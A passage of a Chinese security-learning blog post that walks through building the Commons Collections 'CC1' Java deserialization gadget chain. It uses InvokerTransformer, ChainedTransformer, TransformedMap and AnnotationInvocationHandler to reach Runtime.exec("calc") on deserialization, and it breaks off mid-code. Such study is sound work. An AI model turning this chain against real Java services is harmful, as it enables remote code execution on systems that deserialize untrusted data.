title="第二步"></a>第二步</h4><ul><li><p>现在的目的就是要传入value</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">protected</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">checkSetValue</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> value) {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">valueTransformer</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">transform</span><span style="color: #ABB2BF">(value);</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>不知道value可不可控，所以现在就要查看<code>checkSetValue</code>在哪调用了</p></li><li><p>查找调用</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251121141850526.png" alt="image-20251121141843399"></p><p>AbstractInputCheckedMapDecorator.java这个类之下（其实这是TransformedMap的父类）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251121141943814.png" alt="image-20251121141943785"></p></li><li><p>继续看来自<code>MapEntry</code>这个类的<code>setValue</code></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">setValue</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> value) {</span></span><span class="line"><span style="color: #E06C75">    value </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">parent</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">checkSetValue</span><span style="color: #ABB2BF">(value);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">entry</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setValue</span><span style="color: #ABB2BF">(value);</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251121142152586.png"></p></li><li><p>查看<code>setValue</code>的调用</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251121193414997.png" alt="image-20251121193414893"></p><p>返回的是entry.setValue(value);，也就是说value要走这里</p><p><strong>构造试试：</strong></p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">CC1Test</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">r</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//方法名为exec，参数类型为String，参数值为calc</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">InvokerTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">invokerTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;exec&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #ABB2BF">});</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">// invokerTransformer.transform(r);</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//利用hashmap取出每个 Entry，恢复 key 和 value，插入到新的哈希结构中。其中会调用 value.hashCode() 或 key 的方法（导致 transformer 执行）</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">map</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;();</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//map中写入值，后面替换成恶意对象</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">map</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;key&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;value&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">//建立一个“包装器（wrapper）”，使 setValue 会触发 transformer</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">transformedMap</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">TransformedMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(map,</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">,invokerTransformer);</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">// 遍历，通过 setValue 强制触发 transformer，把恶意对象注入到 HashMap 的内部 Entry 中</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">Entry</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">entry</span><span style="color: #C678DD">:</span><span style="color: #E5C07B">transformedMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">entrySet</span><span style="color: #ABB2BF">()){</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">entry</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setValue</span><span style="color: #ABB2BF">(r);</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span></code></pre></div></div></figure><p>for循环遍历：</p><ol><li>每次循环取出TransformedMap中的Entry节点对象（包含 key&#x2F;value）</li><li>当前这个 entry 的 value 替换成 r（因为它是 <strong>TransformedMap 包装过的 Entry</strong>，实现了setValue 强制触发 valueTransformer.transform(r)）</li></ol></li><li><p>目前的流程</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251121203814114.png" alt="image-20251121203814040"></p></li></ul><h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><ul><li><p>接下来就是按照上面的方法找setvalue</p><p>先找有没有<code>哪个类的readObject</code>直接调用了<code>setvalue</code></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251121204122796.png"></p><p>既有readobject，还有数组遍历，还调用了setvalue</p></li><li><p>看看这个类的构造函数</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251121204433591.png" alt="image-20251121204433543"></p><p>map可控，直接将前面构造好的map传入即可</p><p><strong>注意：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251121204603155.png" alt="image-20251121204603131"></p><p>class默认为**<code>default</code>** 类型(<strong>包访问权限</strong>，在这个包下面才能访问)——-&gt;<strong>需要反射</strong></p></li></ul><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ol><li><p>Runtime没有反序列化接口，需要反射</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Class</span><span style="color: #E06C75"> c </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E5C07B">Method</span><span style="color: #E06C75"> getRuntimeMethod </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getMethod</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;getRuntime&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">Runtime</span><span style="color: #E06C75"> r </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (Runtime) </span><span style="color: #E5C07B">getRuntimeMethod</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">invoke</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">Method</span><span style="color: #E06C75"> execMethod </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getMethod</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;exec&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">execMethod</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">invoke</span><span style="color: #ABB2BF">(r, </span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure></li><li><p>这个类下的setvalue方法返回的是一个AnnotationTypeMismatchExceptionProxy对象</p><p><strong>不是我们上面想要的runtime对象</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251121205546585.png" alt="image-20251121205546549"></p></li><li><p>处理这个类下的if条件过滤</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251121210557225.png" alt="image-20251121210557183"></p></li></ol><h3 id="逐步构造"><a href="#逐步构造" class="headerlink" title="逐步构造"></a>逐步构造</h3><h4 id="解决问题1"><a href="#解决问题1" class="headerlink" title="解决问题1"></a>解决问题1</h4><ul><li><p>根据runtime反射   对InvokerTransformer写runtime反射</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Method</span><span style="color: #E06C75"> getRuntimeMethod </span><span style="color: #56B6C2">=</span><span style="color: #E06C75">(Method) </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;getMethod&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">Class</span><span style="color: #E06C75">[]</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #E06C75">}</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[]{</span><span style="color: #98C379">&quot;getRuntime&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">null</span><span style="color: #E06C75">})</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">transform</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E5C07B">Runtime</span><span style="color: #E06C75"> r </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> (Runtime)</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;invoke&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75">[]{</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[]</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #E06C75">}</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[]{</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">null</span><span style="color: #E06C75">})</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">transform</span><span style="color: #ABB2BF">(getRuntimeMethod);</span></span><span class="line"><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;exec&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #E06C75">}</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[]{</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #E06C75">})</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">transform</span><span style="color: #ABB2BF">(r);</span></span></code></pre></div></div></figure><p>但是步骤太多，每一句都是transform的循环调用</p><p>正好有一个chainedtransformer（）</p></li><li><p>chainedtransformer（）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ChainedTransformer</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Transformer</span><span style="color: #E06C75">[] transformers) {</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">super</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">       iTransformers </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> transformers</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">   }</span></span><span class="line"><span style="color: #E06C75">   </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">transform</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> object) {</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">for</span><span style="color: #E06C75"> (</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">iTransformers</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i</span><span style="color: #ABB2BF">++</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">           object </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> iTransformers[i]</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">transform</span><span style="color: #ABB2BF">(object);</span></span><span class="line"><span style="color: #E06C75">       }</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> object</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">   }</span></span></code></pre></div></div></figure><p>把Transformer当作数组写进去之后，接下来递归调用</p></li><li><p>编写</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//利用ChainedTransformer缩减代码</span></span><span class="line"><span style="color: #E5C07B">Transformer</span><span style="color: #E06C75">[] transformers </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Transformer</span><span style="color: #E06C75">[]{</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;getMethod&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">,</span><span style="color: #E5C07B">Class</span><span style="color: #E06C75">[]</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #E06C75">}</span><span style="color: #ABB2BF">,</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[]{</span><span style="color: #98C379">&quot;getRuntime&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">null</span><span style="color: #E06C75">})</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;invoke&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75">[]{</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[]</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #E06C75">}</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[]{</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">})</span><span style="color: #ABB2BF">,</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;exec&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #E06C75">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #E06C75">}</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75">[]{</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #E06C75">})</span></span><span class="line"><span style="color: #E06C75">}</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E5C07B">ChainedTransformer</span><span style="color: #E06C75"> chainedTransformer </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ChainedTransformer</span><span style="color: #E06C75">(transformers)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">transform</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span></code></pre></div></div></figure></li><li><p>写map+调用</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251121222320294.png" alt="image-20251121222319237"></p><p>invokerTransformer替换为chainedTransformer（调用一次相当于调用三次）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> map </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">map</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">put</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;key&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;aaaa&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">       </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt;</span><span style="color: #E06C75"> transformedMap </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">TransformedMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(map, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">, chainedTransformer);</span></span></code></pre></div></div></figure></li><li><p>加上序列化和反序列化的执行代码</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">Class</span><span style="color: #E06C75"> c </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Constructor</span><span style="color: #E06C75"> annotationInvocationhdlConstructor </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredConstructor</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setAccessible</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> o </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">newInstance</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Override</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, transformedMap);</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(o)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #61AFEF">unserialize</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #E06C75">)</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">}</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">serialize</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> obj) throws IOException {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">ObjectOutputStream</span><span style="color: #E06C75"> oos </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">ObjectOutputStream</span><span style="color: #E06C75">(</span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">FileOutputStream</span><span style="color: #E06C75">(</span><span style="color: #98C379">&quot;ser.bin&quot;</span><span style="color: #E06C75">))</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">oos</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">writeObject</span><span style="color: #ABB2BF">(obj);</span></span><span class="line"><span style="color: #E06C75">}</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: 